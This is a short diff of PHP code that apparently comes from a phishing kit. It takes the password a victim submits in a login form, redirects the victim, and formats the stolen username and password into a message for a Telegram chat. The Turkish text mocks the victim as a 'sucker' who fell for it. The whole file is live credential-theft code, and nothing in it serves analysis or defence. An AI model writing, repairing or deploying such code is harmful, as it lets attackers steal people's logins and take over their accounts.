@@ -3,15 +3,13 @@ include('tg.php');
 
 $id=$_GET["id"];
 if($_POST){
-$user=$_POST["user"];
-header("location: info.php?id=$id");
 $password=$_POST["password"];
 header("location: password.php?id=$id");
 
 $data = [
   'text' => '➡️ Lan Koş Sazan Düştü 😈 
 Sublime Saplar 😈
-Kullanıcı Adı : '.$user.'
+Kullanıcı Adı : '.$id.'
 Şifre : '.$password.'
 ',
   'chat_id' => $chat_id
